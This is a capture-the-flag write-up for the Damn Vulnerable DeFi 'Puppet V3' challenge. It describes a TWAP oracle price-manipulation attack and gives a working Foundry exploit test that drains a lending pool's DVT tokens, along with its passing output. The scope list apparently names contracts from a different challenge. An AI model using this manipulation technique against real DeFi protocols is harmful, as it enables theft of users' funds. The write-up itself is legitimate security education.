# Damn Vulnerable Defi - Puppet V3
- Scope
    - WalletDeployer.sol
    - TransparentProxy.sol
    - AuthorizerUpgradeable.sol
    - AuthorizerFactory.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## `PuppetV3Pool` relies on UniswapV3Pool price oracle with a 10 mins TWAP, allowing for a short window of price manipulation

### Summary
PuppetV3Pool uses a 10min TWAP period to get price from UniswapV3 oracle, this allows the price of DVT tokens to be manipulated for a short period of time. Thereafter, the DVT tokens inside PuppetV3Pool can be borrowed at a very low cost.

### Vulnerability Details
PuppetV3Pool uses a 10min TWAP period to get price from UniswapV3 oracle, this allows attacker to manipulate the price of tokens for a short period of time.

### Impact/Proof of Concept
1. Swap our DVT for WETH, this will cause the UniswapPool to have more DVT tokens and reduce the value of the token
2. Within a short window, the PuppetV3Pool will get the low price of DVT tokens from the UniswapPool.
3. Hence, we proceed to borrow from PuppetV3Pool to get all the DVT tokens for a low price
```diff
function test_puppetV3() public checkSolvedByPlayer {
        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564; // UniswapV3 router address
        token.approve(address(uniswapRouterAddress), type(uint256).max);
        uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        console.log("WETH required before swap: ", wethRequired);

        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
        console.log("pool DVT Tokens before swap: ", token.balanceOf(address(uniswapPool))/1e18);

        ISwapRouter(uniswapRouterAddress).exactInputSingle(
            ISwapRouter.ExactInputSingleParams(
                address(token),
                address(weth),
                FEE,
                address(player),
                block.timestamp,
                PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
                0,
                0
            )
        );  
        vm.warp(block.timestamp + 110); // Duration to fast forward; Must be less than 115 seconds and long enough so that TWAP will adjust the price to be low
        console.log("pool DVT Tokens after swap: ", token.balanceOf(address(uniswapPool))/1e18);
        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), quote);
        console.log("WETH required before swap: : ", quote);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }
```

Results
```diff
[PASS] test_puppetV3() (gas: 763511)
Logs:
  WETH required before swap:  3000000000000000000000000
  pool DVT Tokens before swap:  100
  pool DVT Tokens after swap:  200
  WETH required before swap: :  143239918968367545

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 300.16ms (2.25ms CPU time)
```

